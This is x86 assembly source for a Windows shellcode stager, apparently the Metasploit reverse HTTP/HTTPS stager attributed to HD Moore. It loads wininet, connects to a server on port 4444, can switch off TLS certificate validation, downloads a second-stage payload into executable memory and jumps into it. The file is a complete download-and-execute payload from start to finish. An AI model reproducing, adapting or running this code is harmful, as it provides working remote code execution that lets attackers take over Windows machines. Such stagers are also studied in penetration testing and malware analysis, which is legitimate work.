;-----------------------------------------------------------------------------;
; Author: HD Moore
; Compatible: Confirmed Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
; Version: 1.0
;-----------------------------------------------------------------------------;
[BITS 32]

%ifdef ENABLE_SSL
%define HTTP_OPEN_FLAGS ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000 )
  ;0x80000000 | ; INTERNET_FLAG_RELOAD
  ;0x04000000 | ; INTERNET_NO_CACHE_WRITE
  ;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
  ;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
  ;0x00000200 | ; INTERNET_FLAG_NO_UI
  ;0x00800000 | ; INTERNET_FLAG_SECURE
  ;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
  ;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
%else
%define HTTP_OPEN_FLAGS ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 )
  ;0x80000000 | ; INTERNET_FLAG_RELOAD
  ;0x04000000 | ; INTERNET_NO_CACHE_WRITE
  ;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
  ;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
  ;0x00000200   ; INTERNET_FLAG_NO_UI
%endif

; Input: EBP must be the address of 'api_call'.
; Output: EDI will be the socket for the connection to the server
; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
load_wininet:
  push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
  push 0x696e6977        ; ...
  push esp               ; Push a pointer to the "wininet" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "wininet" )

  xor ebx,ebx

internetopen:
  push ebx               ; DWORD dwFlags
  push ebx               ; LPCTSTR lpszProxyBypass (NULL)
  push ebx               ; LPCTSTR lpszProxyName (NULL)
  push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
  push ebx               ; LPCTSTR lpszAgent (NULL)
  push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
  call ebp

internetconnect:
  push ebx               ; DWORD_PTR dwContext (NULL)
  push ebx               ; dwFlags
  push byte 3            ; DWORD dwService (INTERNET_SERVICE_HTTP)
  push ebx               ; password (NULL)
  push ebx               ; username (NULL)
  push dword 4444        ; PORT
  jmp short dbl_get_server_host ; push pointer to HOSTNAME
got_server_host:
  push eax               ; HINTERNET hInternet
  push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
  call ebp

httpopenrequest:
  push ebx               ; dwContext (NULL)
  push HTTP_OPEN_FLAGS   ; dwFlags
  push ebx               ; accept types
  push ebx               ; referrer
  push ebx               ; version
  jmp get_server_uri     ; push pointer to url
got_server_uri:
  push ebx               ; method
  push eax               ; hConnection
  push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
  call ebp
  xchg esi, eax          ; save hHttpRequest in esi

set_retry:
  push byte 0x10
  pop edi

send_request:

%ifdef ENABLE_SSL
; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
set_security_options:
  push 0x00003380
    ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
    ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
    ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
    ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
    ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
  mov eax, esp
  push byte 4            ; sizeof(dwFlags)
  push eax               ; &dwFlags
  push byte 31           ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
  push esi               ; hHttpRequest
  push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
  call ebp

%endif

httpsendrequest:
  push ebx               ; lpOptional length (0)
  push ebx               ; lpOptional (NULL)
  push ebx               ; dwHeadersLength (0)
  push ebx               ; lpszHeaders (NULL)
  push esi               ; hHttpRequest
  push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
  call ebp
  test eax,eax
  jnz short allocate_memory

try_it_again:
  dec edi
  jnz send_request

; if we didn't allocate before running out of retries, fall through to
; failure

failure:
  push 0x56A2B5F0        ; hardcoded to exitprocess for size
  call ebp

dbl_get_server_host:
  jmp get_server_host

get_server_uri:
  call got_server_uri

server_uri:
 db "/12345", 0x00

allocate_memory:
  push byte 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push 0x00400000        ; Stage allocation (8Mb ought to do us)
  push ebx               ; NULL as we dont care where the allocation is
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

download_prep:
  xchg eax, ebx          ; place the allocated base address in ebx
  push ebx               ; store a copy of the stage base address on the stack
  push ebx               ; temporary storage for bytes read count
  mov edi, esp           ; &bytesRead

download_more:
  push edi               ; &bytesRead
  push 8192              ; read length
  push ebx               ; buffer
  push esi               ; hRequest
  push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
  call ebp

  test eax,eax           ; download failed? (optional?)
  jz failure

  mov eax, [edi]
  add ebx, eax           ; buffer += bytes_received

  test eax,eax           ; optional?
  jnz download_more      ; continue until it returns 0
  pop eax                ; clear the temporary storage

execute_stage:
  ret                    ; dive into the stored stage address

get_server_host:
  call got_server_host

server_host:

